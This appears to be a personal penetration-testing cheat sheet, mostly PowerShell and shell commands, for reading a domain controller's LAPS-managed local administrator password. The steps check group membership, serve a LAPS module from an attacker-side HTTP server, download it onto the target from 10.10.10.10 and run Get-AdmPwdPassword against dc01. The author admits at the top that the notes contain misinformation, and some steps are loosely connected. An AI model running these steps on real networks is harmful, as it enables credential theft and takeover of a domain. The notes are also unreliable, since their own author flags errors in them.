>There are definitely misinfo in here. I don't understand this.

# Check privilege

```powershell
# should be in LAPS_Readers group
net user <user>

```
# LAPS PS module

## Clone repo

```sh
git clone https://github.com/ztrhgf/LAPS.git
```

## Transfer

Open http server

```sh
mkdir upload
zip -r ./upload/AdmPwd.PS.zip ./LAPS/AdmPwd.PS
cd upload
python3 -m http.server 80
```

Download

```powershell
wget http://10.10.10.10:80/AdmPwd.PS.zip
Expand-Archive -Path ".\AdmPwd.PS.zip" -DestinationPath ".\AdmPwd.PS"
```

## Check 

See who(groups) can actually read or reset passwords

```powershell
Find-LAPSDelegatedGroups
```

```powershell
Find-AdmPwdExtendedRights -identity *
```

See if we can read `Domain Controller` password. Should returns `LAPS Readers`, which is the group that we are in

```powershell
Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
```

## Import PS module

```powershell
import-module .\AdmPwd.PS\AdmPwd.PS.psd1
```

## Read domain controller password

```powershell
Get-LAPSComputers
```

or

```powershell
$env:COMPUTERNAME
get-admpwdpassword -computername dc01 | Select password
```

